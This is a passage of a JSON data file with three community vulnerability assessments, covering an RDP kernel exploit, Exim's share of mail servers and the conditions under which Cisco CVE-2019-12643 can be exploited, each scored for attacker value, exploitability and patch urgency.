      "revisionDate": "2020-04-26T23:02:30.068358Z",
      "document": "What a pain to make it work generally across different versions! The work put into this will be foundational for future exploit development around RDP and Windows kernel exploitation in general.",
      "score": 6,
      "metadata": {
        "stability": 1,
        "reliability": 1,
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "923acd33-b7ed-47c7-9e9b-28869d96a37e",
      "editorId": "1d16f9b2-7bcc-4e1d-bd7c-93cff5364bc5",
      "topicId": "d2c5f192-f965-4d8e-8fcc-126183f9124a",
      "created": "2019-09-09T14:13:13.315761Z",
      "revisionDate": "2021-08-23T22:52:27.485795Z",
      "document": "Exim is run on approximately 57% of the publicly reachable mail servers on the Internet, based on an August 2019 study performed by E-Soft, Inc. [1]\r\n\r\n[1]: http://www.securityspace.com/s_survey/data/man.201907/mxsurvey.html",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4
      },
      "tags": []
    },
    {
      "id": "f690c260-afa9-4ed6-b71e-b69a079270b7",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "1c04af80-21d4-49ee-9a16-921297dd3e60",
      "created": "2019-09-12T13:43:33.256938Z",
      "revisionDate": "2020-09-14T10:46:25.592568Z",
      "document": "High attacker utility if only the vulnerability is considered. \r\n\r\nQuoting [Cisco](https://blogs.cisco.com/security/cve-2019-12643):\r\n\r\n> In order for a device to be considered vulnerable, all of the following conditions must be met:\r\n> \r\n> 1. A REST API OVA package with a version below 16.9.3 must be present on the device local storage\r\n> 2. The REST API virtual service is installed\r\n> 3. The REST API virtual service is configured\r\n> 4. The REST API virtual service is enabled\r\n\r\nGiven that the vulnerable service is not enabled by default and requires some extra steps to even set up, I am unsure of the actual likelihood of successful exploitation. Echoing what Brendan said, mitigations are already in place on the device if the vulnerable service is installed and enabled. Because of that, I wouldn't say that this is the most urgent of patches to install, although it's always better to have a patched system.",
      "score": 7,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    }
  ]
}